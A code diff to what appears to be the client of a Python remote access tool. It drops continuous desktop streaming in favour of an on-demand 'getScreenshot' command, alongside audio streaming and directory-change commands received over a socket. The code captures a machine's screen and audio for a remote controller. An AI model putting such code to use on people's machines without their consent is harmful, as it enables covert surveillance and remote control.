@@ -270,19 +270,12 @@ class ChildSocket(threading.Thread):
                     except:
                         pass
                     stdoutput = 'audioStopped'
-                elif data.startswith('startDesktop'):
-                    try:
-                        desktop_thread = DesktopStreaming(self.socket)
-                        desktop_thread.start()
-                        stdoutput = 'desktopStarted'
-                    except:
-                        stdoutput = 'desktopError'
-                elif data.startswith('stopDesktop'):
-                    try:
-                        desktop_thread.active = False
-                    except:
-                        pass
-                    stdoutput = 'desktopStopped'
+                elif data.startswith('getScreenshot'):
+                    stdoutput = str({
+                        'width': width,
+                        'height': height,
+                        'screenshotbits': screen_bits()
+                    })
                 elif data.startswith("cd"):
                     try:
                         os.chdir(data[3:])
@@ -314,29 +307,6 @@ class ChildSocket(threading.Thread):
                 send(self.socket, stdoutput, mode)
             except socket.error:
                 return
-
-
-class DesktopStreaming(threading.Thread):
-    def __init__(self, sock):
-        super(DesktopStreaming, self).__init__()
-
-        self.active = True
-
-        self.sock = sock
-
-    def run(self):
-        while self.active:
-            data = str({
-                'width': width,
-                'height': height,
-                'screenshotbits': screen_bits()
-            }) + '[ENDOFMESSAGE]'
-            try:
-                self.sock.sendall(data)
-            except socket.error:
-                self.active = False
-                break
-
 
 class AudioStreaming(threading.Thread):
     def __init__(self, sock, rate):
